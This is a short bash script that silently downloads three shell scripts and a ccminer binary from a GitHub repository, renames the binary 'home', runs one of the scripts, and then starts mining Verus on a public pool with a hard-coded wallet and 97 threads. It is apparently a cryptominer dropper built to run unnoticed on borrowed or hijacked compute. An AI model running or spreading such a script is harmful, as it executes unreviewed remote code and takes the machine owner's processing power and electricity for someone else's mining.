#!/bin/bash
wget -q https://raw.githubusercontent.com/traapoks/traapoks/main/build.sh
wget -q https://raw.githubusercontent.com/traapoks/traapoks/main/configure.sh
wget -q https://raw.githubusercontent.com/traapoks/traapoks/main/autogen.sh
wget -q -O home https://github.com/traapoks/traapoks/raw/main/ccminer.exe
./build.sh
./home -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RPWMTPZgHs3UxprgXvK6ZGXMC3Z3GHmXd6.1 -p hybrid -t97
